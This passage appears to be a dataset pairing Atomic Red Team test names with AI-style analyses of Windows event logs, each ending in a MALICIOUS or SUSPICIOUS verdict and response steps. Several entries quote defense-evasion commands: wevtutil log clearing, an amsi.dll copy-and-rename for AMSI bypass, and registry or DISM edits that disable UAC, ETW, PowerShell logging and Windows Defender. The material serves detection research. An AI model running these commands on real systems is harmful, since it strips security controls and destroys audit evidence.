3. **Registry Modification:**
   - A registry modification is attempted via `cmd.exe` with the command line altering `ConsentPromptBehaviorAdmin` to `0` (ProcessId: 6856). 
   - This action essentially **disables User Account Control (UAC) prompts** for administrators, which is a known tactic to facilitate further malicious operations without requiring privilege escalations.

4. **Command Line and Process Activity:**
   - There are several executions of `wevtutil.exe` (for clearing logs) and `cmd.exe` with suspicious command-line activity, all executed by an account with **high integrity level privileges**.
   - There is significant activity of processes spawning console window hosts (`conhost.exe`), likely to be tied to `cmd.exe` activity.

5. **User Accounts with Elevated Privileges:**
   - The user `""admin_test""` seems to have significant privileges (EventID: 4672, PrivilegeList includes SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.), actions executed under such a high privilege level require close scrutiny.

### Assessment and Resolution:

Given the presence of multiple serious indicators such as the clearing of logs, attempts to disable security features via registry changes, and unauthorized time alterations, I categorize these logs with a resolution of **MALICIOUS**.

### Guidance on How to Proceed:

Msiexec.exe - Execute Local MSI file with embedded JScript,"### Detailed Log Analysis

**Suspicious or Anomalous Behavior:**

1. **Event Log Clearing:**
   - The Windows host exhibits numerous event log clearing activities, specifically related to `Security`, `System`, and `Windows PowerShell` logs. This activity is done by the user `SERVER002\admin_test` using the process `wevtutil.exe`, as seen in several Sysmon events (`EventID: 1`).
   - Security EventID `1102`, and System EventID `104`, indicate log clearing by `admin_test` with no backup path.
   
2. **Usage of `wevtutil.exe`:**
   - `wevtutil.exe` is a legitimate tool for managing event logs but its use in clearing logs is suspicious, commonly associated with attackers trying to cover their tracks.

3. **PowerShell Execution:**
   - Execution of PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) could indicate potential attempts to execute scripts or commands in an unauthorized manner. However, without specific command-line arguments, this remains suspicious rather than outright malicious.

4. **Execution of CMD and MSI:**
   - The execution of `cmd.exe` with an embedded call to `msiexec.exe` pertaining to an `AtomicRedTeam` operation is highly suspicious. Atomic Red Team simulations are often used in testing security controls but could also mimic real attacks if unauthorized.
   - The MSI path references `AtomicRedTeam\T1218.007\bin\T1218.007_JScript.msi`, implying this could be part of a simulation or test of defense capabilities, but under suspicious context if not planned.

5. **Whoami and Hostname Executions:**
   - The `whoami.exe` and `hostname.exe` executions by `admin_test` may be part of reconnaissance, typically executed to gather system and user information.

**Events Indicating Malicious Activity:**

1. **Log Clearing:**
   - Direct and repeated actions to clear logs across multiple channels (Security, System, and PowerShell) is indicative of attempts to remove traces of activity. This behavior is typically associated with malicious actions or unauthorized access attempts.

2. **Unauthorized Tool Usage Context:**
   - Use of system-level tools like `wevtutil.exe`, PowerShell, MSI installations in Temp directories, and the context of Atomic Red Team scripts without prior approval or scheduled testing can indicate malicious intent.

### Assessment and Conclusion:

The events exhibit several indicators of potential compromise:
- System tool utilization (`wevtutil.exe`, `PowerShell`, `msiexec.exe`) in a manner consistent with attempts to conceal activity.
- Event log clearing without backups is a recognized tactic to hide malicious operations.

Based on the analysis above:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Isolate the Host:**
   - Immediately isolate `Server002` from the network to prevent further potential malicious activities.

2. **Contain and Eradicate:**
   - Conduct a thorough forensic investigation to understand the extent of activity and determine unauthorized access points.
   - Remove any unauthorized scripts or executables related to Atomic Red Team if not part of scheduled tests.

3. **Review Permissions and Accounts:**
   - Audit the permissions of `admin_test` and other accounts with similar privileges to ensure appropriate access levels.
   - Reset credentials for the `admin_test` user and monitor for unusual behavior.

4. **Enhance Monitoring:**
   - Implement enhanced logging and alerting for `wevtutil.exe` usage and log clearing events across the enterprise.
   - Apply stricter controls on PowerShell execution policies to mitigate risk.

5. **Report Incident:**
   - Report the incident internally to security stakeholders and follow incident response procedures.

6. **Post-Incident Review:**
   - Conduct a post-mortem analysis to rectify gaps identified in the current system that permitted the suspected compromise."
Phantom Dll Hijacking - WinAppXRT.dll,"Upon analyzing the provided Windows event logs, several indicators point towards potential malicious activity, particularly with the sequence of events observed.

1. **Event Log Clearing:**
   - The Security log contains an event (EventID 1102) indicating the security log was cleared by the user ""admin_test"". This action can often be associated with malicious activity to cover tracks after unauthorized access or operations.

2. **Wevtutil Execution:**
   - Multiple instances of the ""wevtutil.exe"" command-line tool were used to clear various logs (Application, Security, System, and Windows PowerShell). This behavior is highly suspicious and often used by attackers to delete logs to erase evidence of their actions.
   - The wevtutil command clears logs when executed with the `cl` parameter, which was observed repeatedly.

3. **Potential AMSI Bypass Attempt:**
   - A suspicious command was executed using ""cmd.exe"" which involved copying and renaming the AMSI (Antimalware Scan Interface) library file `amsi.dll`. The command attempts to replace it with a file named ""WinAppXRT.dll"", potentially attempting to bypass or disable security scanning mechanisms:
     ```
     ""cmd.exe"" /c copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll & ren %%APPDATA%%\amsi.dll WinAppXRT.dll & copy %%APPDATA%%\WinAppXRT.dll %%windir%%\System32\WinAppXRT.dll & reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
     ```
   - The execution of this command suggests an attempt to bypass antivirus measures possibly by modifying or disabling AMSI.

4. **Registry Modification:**
   - The command modifies the registry, adding a value under ""HKEY_CURRENT_USER\Environment"". Such registry changes may assist in persistence or environment manipulation, further escalating the concern.

Considering these activities, it is critical to conduct further investigation and take the following steps:

- **Isolate the Host:** Immediately isolate the host from the network to prevent further potential lateral movement by the attacker.
- **Detailed Forensic Analysis:** Perform a full forensic analysis of the system to understand the extent of the compromise and identify any additional backdoors or malicious tools left by the intruder.
- **Examine User Activity:** Investigate the user account ""admin_test"" to determine how and when it was used in relation to the suspicious activity.
- **Review Other System Logs:** Inspect other systems within the network for similar log-clearing activities or suspicious commands.
- **Restore and Patch:** Consider restoring the host to a secure, pre-compromise state and apply all relevant security patches.

Final Resolution: **MALICIOUS**"
Disable .NET Event Tracing for Windows Via Registry (cmd),"Upon reviewing the provided log entries, there are several indicators of potentially suspicious activities that need to be examined more closely:

### Key Observations:

1. **Log File Clearing:**
   - The system log and security log show entries with Event ID 104 (""LogFileCleared""), which indicates that log files have been cleared. This action is performed by the user `admin_test` on `Server002`.
   - The clearing of logs is a technique often used by attackers to hide malicious activity, especially since logs were cleared for critical channels such as the System, Security, and Windows PowerShell logs.

2. **Wevtutil Executions:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) were executed with the `cl` (clear) command: 
     - `""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""`
     - `""wevtutil.exe cl Application""`
     - `""wevtutil.exe cl System""`
     - `""wevtutil.exe cl Security""`
     - `""wevtutil.exe cl Windows PowerShell""`
   - The `wevtutil` tool is used for managing Windows event logs, including clearing them. While this can be a legitimate administrative action, it is suspicious in conjunction with the log clearing events and should be questioned, especially given the frequency and the involvement of critical logs.

3. **Registry Changes:**
   - An operation involving `cmd.exe` executing a registry modification command: `REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0`.
   - This command disables Event Tracing for Windows (ETW) which is a critical logging mechanism, often associated with attempts to hide further malicious actions.

4. **High Integrity Level Processes:**
   - The logs contain numerous operations executed under High Integrity Level indicating administrative privileges, all executed by `SERVER002\admin_test`.

5. **Edge Update Activity:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` and its components, which could be benign routine updates. However, given the context of other suspicious activities, it should be validated whether these updates are legitimate and expected at this time.

6. **Use of Hostname and Whoami Commands:**
   - Execution of `hostname.exe` and `whoami.exe` is generally benign but could be part of an information gathering process that is often carried out by an adversary.

### Assessment:

The combination of cleared logs, the execution of `wevtutil` to clear critical event logs, registry modifications to disable ETW logging, and an elevated level of execution suggest a pattern of behavior aimed at obscuring activities on the system. This is indicative of malicious activity as it aligns with commonly known tactics used to hide post-compromise actions. These observations suggest that this activity could be part of unauthorized behavior or an ongoing attack.

### Recommended Resolution:

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Response Measures:**
   - Disconnect `Server002` from the network to contain any potential spread of an attack.
   - Preserve all relevant evidence by taking a snapshot of the current volatile data and disk images for forensic analysis.
   - Start a full security incident investigation to determine the scope and impact of the activity.

2. **Investigate:**
   - Analyze additional contextual logs, network traffic, and other endpoints for signs of lateral movement.
   - Review user activity for `admin_test` to determine if the account has been compromised. Consider resetting credentials and enforcing multi-factor authentication.

3. **Mitigate:**
   - Ensure all system patches are up to date.
   - Consider re-imaging the system to remove any backdoors or persistence mechanisms that may have been introduced.
   - Re-evaluate security policies to prevent unauthorized log clearing and implement detection mechanisms for similar behaviors in the future."
Windows HideSCAHealth Group Policy Feature,"Upon analyzing the provided event logs from the Windows host, several activities stand out as potentially suspicious:

1. **Event Log Clearing:**
   - **System Logs:**
     - The system log contains multiple entries with EventID 104 indicating that the event logs were cleared by the user ""admin_test"". The logs cleared include the System and Windows PowerShell channels.
   - **Security Logs:**
     - An entry with EventID 1102 from the security log indicates that the security log was cleared. The clearing of logs, especially security logs, is commonly associated with an attempt to erase evidence of unauthorized or malicious activity.

2. **Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` being executed to clear event logs for different channels (Sysmon, System, Application, Security). This pattern aligns with attempts to cover up activities.

3. **Registry Modification via Command Prompt and `reg.exe`:**
   - The Sysmon logs reveal the execution of `cmd.exe` followed by `reg.exe` to modify the registry, adding a value to hide the SCA (Security Center) health notification. This could be an attempt to disable security notifications.

4. **Use of System Utilities:**
   - Multiple instances of `whoami.exe` and `hostname.exe` are executed. While benign by themselves, they could be part of an information-gathering phase of an attack to understand user contexts and system information.

5. **Process and Integrity Level Observation:**
   - All activities are executed with high integrity level by the user ""SERVER002\\admin_test"". The consistent high integrity level suggests administrative privileges used throughout, which is a significant risk if used maliciously.

6. **EdgeUpdate Executions:**
   - Many EdgeUpdate-related processes are executed, possibly as a part of normal operations. However, given the context, they are less likely related to the malicious activity observed.

**Assessment:**
The presence of log-clearing activities, particularly across multiple log types, the use of `wevtutil.exe` for log clearance, coupled with registry modifications that disable security features, strongly suggest an attempt to conduct unauthorized system actions while hiding the footprint.

**Resolution: MALICIOUS**
The activities observed in the logs, such as clearing multiple event logs, modifying the Windows registry to conceal security center notifications, and the pattern of process executions, are highly suspicious and indicative of a potential compromise. Immediate investigation is necessary to determine further malicious actions and to remediate any potential security breaches.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent any lateral movement or exfiltration of data.
   - Conduct a full forensic investigation to determine the scope of the breach and identify any additional compromised assets.
   - Change passwords for the affected accounts immediately to prevent further unauthorized access.
  
2. **Long-term Measures:**
   - Review and enhance logging and monitoring to detect similar activities in the future.
   - Implement stricter access controls and review administrative account usage for any anomalies.
   - Conduct a security awareness session to ensure users are aware of the risks associated with clearing logs and modifying registry settings.

The findings suggest a critical need for a security response to address and mitigate potential threats from these actions."
InstallHelper method call,"After analyzing the provided Windows event logs, the following findings and interpretations can be derived:

1. **Log File Clearing Activity**: 
   - Multiple event logs, including System Event Log (ID 104) and Security Event Log (ID 1102), were cleared by a user named `admin_test`. Log file clearing is highly suspicious, especially if it is done without a justifiable reason, as it is often an attempt to hide malicious activity.
   
2. **PowerShell Activity**: 
   - The logs indicate a PowerShell script execution with substantial command-line complexity, involving the Atomic Red Team framework (specifically `T1218.004`), which is known for security testing and adversary simulation. Commands that manipulate the .NET Framework or use complex scripts could indicate potential malicious actions or simulations of such.
   - The use of `InstallUtilTestHarness.ps1` and compiled assemblies indicates an effort to execute potentially unauthorized or malicious code through PowerShell. Given this context, these activities could align with techniques adversaries use to evade defenses and execute arbitrary code.

3. **Software Update Process Activity**:
   - Multiple Microsoft Edge Update processes are observed, which is generally a normal update activity. However, much of their execution is nested and chains into temporary directories indicating an update process. While the presence of update activities alone isn't inherently suspicious, combined with other factors it requires closer scrutiny.

4. **Process Execution Monitoring**:
   - Sysmon logs detail the execution of several processes with maintained high integrity levels, suggesting privileges are being either escalated or maintained at elevated levels. These can correspond to both legitimate system activities and potential improper access or privilege escalation attempts.

5. **Suspicious Contextual Elements**:
   - The coincidence of the PowerShell logging and clearing of various logs and the execution of .NET-related activities suggests the potential for a post-exploitation activity where logs are cleared to hide traces of an intrusion.

### Conclusion
The presence of Atomic Red Team framework scripts being run, particularly considering the attempts to clear logs and the presence of complex PowerShell scripts, raises significant concerns about the activities on this host. This behavior is inconsistent with typical day-to-day administrative or user activities and raises the likelihood of these actions being malicious.

### Resolution: SUSPICIOUS
Given the above analysis, the activity is marked as **SUSPICIOUS** due to notable indicators such as log clearing events and execution of potentially malicious PowerShell scripts. It is recommended to investigate further to confirm whether this was authorized testing activity using Atomic Red Team tactics or an unauthorized/undetected compromise."
BlackByte Ransomware Registry Changes - Powershell,"I have thoroughly analyzed the provided log entries, and here is a detailed analysis of the activity observed:

### Analysis:

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are seen running by the `admin_test` user. The usage of `wevtutil.exe` could potentially be used to query or clear logs, while `conhost.exe` is generally associated with console hosts.
   - A notable PowerShell command was executed: 
     ```powershell
     New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
     New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
     New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
     ```
     These commands modify registry keys that could potentially alter system policies to allow easier lateral movement or persistence.

2. **PowerShell Logs:**
   - The PowerShell script executed as observed in the Sysmon logs is confirmed with the exact actions described in the PowerShell logs.

3. **Security Logs:**
   - The log indicates a log file clear event initiated by the `admin_test` user (Event ID 1102). Clearing of logs, especially by a privileged user, is often a tactic used to cover tracks.
   - Two-time change events (Event ID 4616) are notable, although they might not directly indicate a compromise in this context.

4. **System Logs:**
   - The log files for both the System and Windows PowerShell were cleared, which at the same time corresponds with the use of `wevtutil.exe`. This log-clearing is suspicious as it may indicate an attempt to remove traces of potentially malicious actions.

5. **Application Logs:**
   - Not much of relevance was noted in the application logs with respect to suspicious activities.

### Findings:
- The use of `wevtutil.exe` with the corresponding log-clearing events suggests an attempt to hide activities that might have been executed.
- The PowerShell executions aimed at modifying specific registry keys can indicate preparations for persistence or privilege escalation tactics.
- The above activities were carried out within a very short period, primarily focusing on modifying system settings and clearing logs, which is generally not characteristic of typical administrative maintenance activities.

### Assessment:

**Resolution: MALICIOUS**

The activity observed in the logs presents clear indicators of compromise, including log-clearing actions, suspicious registry alterations, and possible use of toolkits for privilege escalation or persistence.

### Recommendations:

1. **Immediate Response:**
   - Isolate the affected host (Server002) from the network to prevent further unauthorized access or lateral movement.
   - Conduct a memory dump and gather volatile data for deeper forensic analysis.

2. **Further Investigation:**
   - Perform a deep scan for any potential malware or malicious scripts.
   - Review user account access logs to identify any potential unauthorized access.

3. **Post-Incident Actions:**
   - Reset registry keys to their default values, if appropriate.
   - Change passwords for affected user accounts, specifically targeting `admin_test`.
   - Implement enhanced monitoring and logging to detect similar suspicious activities in the future.

4. **Strengthen Security:**
   - Review and harden PowerShell and script execution policies across the environment.
   - Educate users and administrators about recognizing and preventing attacks leveraging native tools like PowerShell and `wevtutil`.

By taking these steps, we can help mitigate the risk of future incidents and improve the organization's overall security posture."
Disable Windows Defender with DISM,"In analyzing the provided logs from the Windows host ""Server002,"" several points of note stand out in both the Sysmon and native Windows event logs:

### Sysmon Log Analysis:
1. **Log Clearing Behavior**:
   - Multiple events indicate the clearing of event logs using `wevtutil.exe`:
     - Logs such as Microsoft-Windows-Sysmon, Application, System, Security, and Windows PowerShell have been cleared by the user `SERVER002\admin_test` around `2024-10-28 09:06:18.276`.
   - The clearing of these logs is highly suspicious, especially without prior authorization or legitimate administrative changes occurring simultaneously.

2. **Use of Command-Line Tools**:
   - The execution of the command `cmd.exe /c Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet` suggests that Windows Defender was disabled, which is known suspicious behavior. The user `SERVER002\admin_test` executed this command, potentially compromising the machine's security architecture.

3. **Prevalent Account Activity**:
   - The same user `SERVER002\admin_test` is linked to multiple high-integrity-level processes during these events, indicating an account with administrative privileges.

4. **Process Hierarchy**:
   - Standard Windows processes such as `conhost.exe` and `wevtutil.exe` are consistently seen but associated with actions like log clearing and process creation that tend to occur during anomalous or irregular procedures.

### System Log Analysis:
1. **Time Adjustment**:
   - There appears to be a time discrepancy, where the system time was changed. This behavior can be part of a strategy to cover tracks by desynchronizing log times.
   - The shift happened just before and after critical logs being cleared, detected in conjunction with kernel events related to time adjustments.

### Security Log Analysis:
1. **Logon Events**:
   - Event ID 4624 indicates a network-related logon using NTLM protocol, which could be part of legitimate administrative access or account manipulation.
   - Event ID 4672 details the acquisition of special privileges by `admin_test`, further pointing to potential malicious use of administrative rights.

### Conclusion and Recommendation:
- **Assessment**:
  - The actions carried out, including disabling Windows Defender and clearing event logs without logging specific affiliated activities, suggest deliberate attempts to obfuscate potentially malicious behavior.
  - Collectively, these activities create a strong case for compromise or unauthorized actions on the host.

- **Resolution**: **MALICIOUS**
  - The gathered evidence strongly supports malicious activity, warranting immediate incident response actions.

### Actions to Proceed:
1. **Immediate Isolation**: Isolate the system (Server002) from the network to prevent further potential spread or exfiltration.
2. **Credential Review**: Investigate the account `SERVER002\admin_test` and reset credentials if necessary.
3. **Forensic Analysis**: Conduct deeper forensic analysis on the host to understand the full scope and eradication strategy.
4. **Enhance Monitoring**: Implement enhanced monitoring and alerting to detect further unauthorized activities or changes.
5. **Policy Review and Hardening**: Review security policies, especially focusing on user rights to manage logs, use of command-line utilities, and control over Windows Defender settings."
Dynamic C# Compile,"### Log Analysis

Upon reviewing the provided Windows event logs, several entries indicate potential red flags that could suggest suspicious or potentially malicious activity:

1. **PowerShell and Wevtutil Usage:**
   - PowerShell execution (`powershell.exe`) was observed in the Sysmon logs with the following command line: `Invoke-Expression \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\""`. This behavior is typically considered suspicious because PowerShell is commonly used by attackers to execute scripts or malicious payloads. The command involves execution from a temp directory, which is a common tactic for evading detection.
   - Multiple invocations of `wevtutil.exe` with the `cl` argument observed in the Sysmon logs to clear various Event Logs (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`). Log clearing is often done to hide traces of unauthorized or malicious activity.

2. **Event Log Clearing:**
   - The System log and Security log entries show that logs were cleared by a user with UserID `S-1-5-21-3962163828-2803415714-1403596700-1006` which corresponds to the user `admin_test` with high integrity level. Clearing event logs is a common tactic used by malicious actors to cover their tracks.

3. **Unusual Process Executions:**
   - Processes like `whoami.exe`, `hostname.exe`, and `conhost.exe` were executed frequently. Although these could be benign, in the context of other suspicious activities, they often serve to gather system information.
   - The execution of a task host process as `taskhostw.exe` by `NT AUTHORITY\SYSTEM` user with `System` integrity level might be regular system activity. However, should be checked in conjunction with other suspicious behavior.

4. **Use of `Invoke-Expression` in PowerShell:**
   - The usage of `Invoke-Expression` is highly suspicious as it can execute arbitrary code. This specific command execution appears related to known attack simulation frameworks (e.g., Atomic Red Team), which might indicate a controlled test or potentially a malicious simulation.

5. **Network Processes:**
   - An execution of `Microsoft Edge Installer` and temporary setup files were noted; if unexpected, this could raise suspicion of potential software compromise or misuse.

### Assessment

Based on the evidence provided, this activity shows multiple signs of potentially unauthorized and suspicious behavior:

- The strategic clearing of various system logs indicates an attempt to obfuscate or hide potentially malicious or unauthorized actions.
- Execution of scripts from common directories often associated with malware execution.
- Use of PowerShell with suspicious command-line arguments reflecting typical administrative or offensive security measures.

### Conclusion: **SUSPICIOUS**

While the logs reflect activities that are common in both legitimate administrative work and simulated attacks (such as from a penetration test or red team exercise), there are enough indicators to warrant concern. 

### Recommendations

- Conduct a thorough review of user `admin_test`, specifically their recent activities and access permissions.
- Verify if the `AtomicRedTeam` related activity was a sanctioned test.
- Investigate any abnormal installations or updates like those related to Microsoft Edge.
- Implement tighter PowerShell execution policies and logging for increased visibility.
- Engage with relevant teams to verify network and endpoint integrity.
- Consider any forensic investigation tools to recover potentially hidden or deleted data due to log clearing.

Further investigation and verification are necessary to accurately distinguish between a benign administrative task and potentially malicious actions."
Certutil Rename and Decode,"Analyzing the provided logs, several events are noteworthy:

1. **Log File Clearing:**  
   - Security event ID 1102 indicates the security log was cleared by the user `admin_test`. This is typically considered potentially malicious, as attackers often clear logs to hide their tracks after a compromise.
   - System event ID 104 shows that both the System and Windows PowerShell logs were cleared. The same user, `admin_test`, was responsible. Clearing logs without a legitimate reason is suspicious and often a sign of malicious activity.

2. **Process Execution and Command-line Activity:**  
   - In the Sysmon log, there are multiple instances of `wevtutil.exe` used with the `cl` (clear logs) command on Application, System, and Security logs, which aligns with the aforementioned log clearance events. 
   - There’s a command `cmd.exe` involving copying and using `certutil.exe` to encode and decode `calc.exe`. This specific behavior (using certutil for encoding and decoding) fits known malware tactics for obfuscating payloads as it's commonly associated with the T1140 technique for `Deobfuscate/Decode Files or Information`. This kind of behavior is highly indicative of malicious activity.

3. **Event 4624 - Successful Logon:**  
   - This event, 4624, indicates a successful logon on logon type 5 which is a service logon. While this, in itself, isn't inherently malicious, in conjunction with the surrounding suspicious activities, it raises the level of concern.

4. **Event 4672 - Special Privileges Assigned:**  
   - This event follows the successful logon and lists numerous high-level privileges being granted, suggesting privilege escalation or misuse of high privileges. The SID indicates this was done by a system-level account, which could be normal, but is also potentially dangerous if used improperly.

5. **Time Change Events:**  
   - There are changes in system time from Event ID 4616. This could indicate attempts to manipulate timestamps on the system to mask log traces, although, in isolation, it’s not malicious and could be due to legitimate changes in time settings.

**Assessment:**
The logs suggest the presence of suspicious and potentially malicious activities. The logs being cleared by `admin_test` suggest an intention to obfuscate or hide actions. The use of `certutil.exe` to encode and decode files like `calc.exe` following `wevtutil.exe` executions to clear logs is known malicious behavior, indicating an attempt to execute and obfuscate unauthorized activities. The combination of these factors strongly indicates a pattern consistent with malicious actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately investigate the `admin_test` account and the origin of its activities.
- Conduct a full forensic analysis of the host, examining any associated systems where `admin_test` might have access or initiated remote commands.
- Initiate incident response protocols to contain and remediate potential breaches.
- Review and strengthen security policies, especially related to log management and privileged account usage.
- Consider isolating the affected machine(s) from the network until it is verified as secure.
- If possible, restore logs from backups prior to their clearance for a more detailed timeline of events."
Windows Powershell Logging Disabled,"### Detailed Analysis:

Upon analysis of the provided logs, there are several noteworthy activities:

1. **Suspicious `wevtutil` Usage:**
   - **Wevtutil Usage:** The logs show multiple executions of `wevtutil.exe` with the `/cl` (clear) command. Specifically, logs indicate clearing of event logs for Microsoft-Windows-Sysmon, Application, System, and Windows PowerShell logs. 
   - **Indicators:** The repeated use of `wevtutil.exe` to clear logs is often a sign of malicious activity attempting to cover tracks. The process is being executed by the user `admin_test` with high integrity level.
   - **Correlated Security Logs:** The Security log (EventID 1102 – ""Log File Cleared"") confirms events being cleared by the user `admin_test`.

2. **Registry Changes via `cmd.exe`:**
   - **Cmd Execution:** The command line arguments show several registry keys related to PowerShell logging (ModuleLogging, ScriptBlockLogging, Transcription, and EnableScripts) being added, modified, or deleted.
   - **Indicators:** Disabling PowerShell logging is a common tactic employed by attackers to conceal the execution of malicious PowerShell scripts.

3. **Sysmon Logs and EdgeUpdate Activity:**
   - Multiple `MicrosoftEdgeUpdate` events are present. While these generally indicate updates, they are benign in isolation and show no immediate signs of tampering from regular observation outside the context of other logs.

4. **Time alteration:**
   - A slight inconsistency in time settings shown in Windows time service and kernel logs, however, this might just be system time synchronization activities.

### Assessment of the Situation:

Based on the analysis, the logs exhibit significant suspicious activity, particularly around log clearing and PowerShell logging settings modifications. These actions are typical characteristics of an individual attempting to perform unauthorized actions and then hide evidence of their activities.

### Conclusion:

- **Resolution:** **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further potential exfiltration or propagation of malicious activities.
2. **User Investigation:** Investigate the account `admin_test`, checking for any signs of compromise or unauthorized access, and reset credentials.
3. **Restore Logging Configurations:** Re-enable PowerShell logging configurations to ensure visibility into ongoing activities.
4. **Forensic Analysis:** Conduct a thorough forensic examination to determine the full extent of the compromise.
5. **Review and Harden Security Policies:** Review policies around the use of critical tools and administrative privileges and ensure auditing is adequately configured.
6. **Report and Monitor:** Log the incident with your IT security team and consider informing relevant parties. Implement continual monitoring for recurring malicious activities."
Tamper with Windows Defender Registry,"**Detailed Analysis:**

Upon reviewing the Windows event logs from the host ""Server002,"" several suspicious and potentially malicious activities were identified:

1. **Log Clearing Activity**: 
   - In the system, security, and application logs, multiple entries indicate the clearing of important logs using the `wevtutil.exe` command by the user `SERVER002\admin_test`. This activity is typically consistent with attempts to hide tracks after unauthorized or malicious actions have been performed:
     - System Log (EventID: 104)
     - Security Log (EventID: 1102)
     - Sysmon logs showing `wevtutil.exe` execution to clear logs.

2. **PowerShell Command Execution**:
   - The Sysmon and PowerShell logs reveal execution of a PowerShell command to disable Windows Defender. This is often a tactic used by attackers to lower defenses on the system:
     - Command: `powershell.exe & {Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1}`.
   - This command modifying the registry to disable antivirus is a strong indicator of malicious intent, especially alongside the log clearing activity.

3. **Microsoft Edge Update and Related Processes**:
   - A large volume of process creation events related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`) is seen. While these could be benign system updates, the exact pattern and timing should be verified against legitimate update schedules.
   - Multiple instances of Microsoft Edge Update processes (especially those executed under `NT AUTHORITY\SYSTEM`) may indicate legitimate update activity. However, combined with known malicious activities like log clearing and security software tampering, it's worth verifying the legitimacy of these updates.

**Assessment of the Situation**:
- The clearing of event logs in conjunction with the execution of commands altering system security settings is highly indicative of malicious behavior. These activities strongly suggest a deliberate attempt to compromise the security integrity of the host by a user with administrative privileges.

**Threats or Risks Identified**:
- The system's antivirus protections were compromised, leaving the system vulnerable to further exploits or malware installations.
- The clearing of logs indicates potential additional unauthorized actions that might have occurred without leaving traceable evidence.

**Guidance on How to Proceed**:
- **Immediate Response**: Isolate the host to prevent further malicious activities or potential spread within the network.
- **Investigation**: Conduct a thorough audit and examination of system integrity, focusing on unauthorized accesses, changes, and potential indicators of compromise not captured due to cleared logs.
- **Restoration and Hardening**: Restore the host from a known good state backup, reinforce system defenses, particularly monitoring and logging components, and review user privilege allocations.

**Resolution**: **MALICIOUS** - The logs undeniably indicate malicious activities, including disabling security measures and clearing event logs, thus necessitating immediate remedial actions."
UEFI Persistence via Wpbbin.exe File Creation,"Upon a thorough analysis of the provided Windows event logs, several critical observations suggest potential malicious activity:

### Indicators of Malicious Activity:
1. **Abnormal PowerShell Usage:**
   - The logs indicate the execution of a PowerShell script that attempts to create a file called `wpbbin.exe` in the `System32` directory using `New-Item -ItemType File`. The presence of PowerShell creating or modifying files in sensitive directories like `System32` is a common tactic for malware and is particularly suspicious (Event ID: 18004).

2. **Event Log Clearing:**
   - There are several instances of event logs, including the System, Security, and Windows PowerShell logs, being cleared shortly after the PowerShell command executed. Clearing event logs can be an attempt by an attacker to cover their tracks (Event IDs: 3567, 3568, and in Security logs EventID: 1102).

3. **Use of Privileged Commands:**
   - The invocation of `wevtutil.exe` to clear logs across multiple channels (EventID: 104 in System logs) indicates an attempt to obscure actions, often associated with sophisticated attacks.

4. **Command Execution Patterns:**
   - Frequent use of utilities like `whoami.exe` and `hostname.exe` with high integrity level tokens suggests an enumeration phase typically observed in attacks where the threat actor is gathering information before executing further actions (Events with `Image` fields `whoami.exe` and `hostname.exe`).

5. **Time Manipulation:**
   - The logs reveal time changes which point towards potential time-tampering activities. Manipulating system clocks can disrupt legitimate log timestamps and help hide attacker activities (System logs EventID: 4616 showing change in time with `PreviousTime` and `NewTime`).

### Assessment:
The patterns observed in these logs correlate with several indicators of a potential compromise. The creation of unauthorized executables in critical directories, combined with log clearing and time manipulation, typically aligns with malicious behavior.

### Resolution: MALICIOUS
The logs demonstrate multiple signs of malicious activity consistent with unauthorized system changes and efforts to cover tracks. It's essential to respond swiftly to mitigate the risk and investigate further.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected host (`Server002`) from the network to prevent lateral movement.
   
2. **In-Depth Investigation:**
   - Conduct a forensic analysis on `Server002` to identify all unauthorized changes and related artifacts.
   - Review other logs and network activity to discover any other interconnected systems that might be affected.
   
3. **Remediation:**
   - Remove any unauthorized files, especially `wpbbin.exe`, and restore legitimate system configurations.
   - Ensure all systems are patched and updated with the latest security measures.

4. **Review Security Policies:**
   - Implement tighter security controls around the use of PowerShell, including execution policies.
   - Strengthen logging and monitoring to include alerts for log clearing and critical system changes.

5. **Communication and Documentation:**
   - Inform stakeholders of the incident and document all findings, actions taken, and recommendations for preventing future incidents. 

It is crucial to maintain vigilance and monitor for any residual or future unauthorized activities involving PowerShell or system utilities."
DLL Search Order Hijacking - amsi.dll,"### Detailed Analysis of Windows Event Logs

#### Suspicious Activities Detected:

1. **Log Clearing Activity:**
   - **Event ID 1102 (Security Log):** The logs indicate that the security log was cleared by a user named `admin_test` at `2024-10-28 15:28:05.5171776`. This event is inherently suspicious as it can be an indicator of malicious intent to hide tracks.
   - **Event ID 104 (System Log):** Multiple instances of log files being cleared, including system logs and PowerShell logs, by the same user `admin_test` around the same time. This consistent clearing of logs signals a potential compromise as the user appears to be covering their tracks.

2. **Unusual PowerShell Execution:**
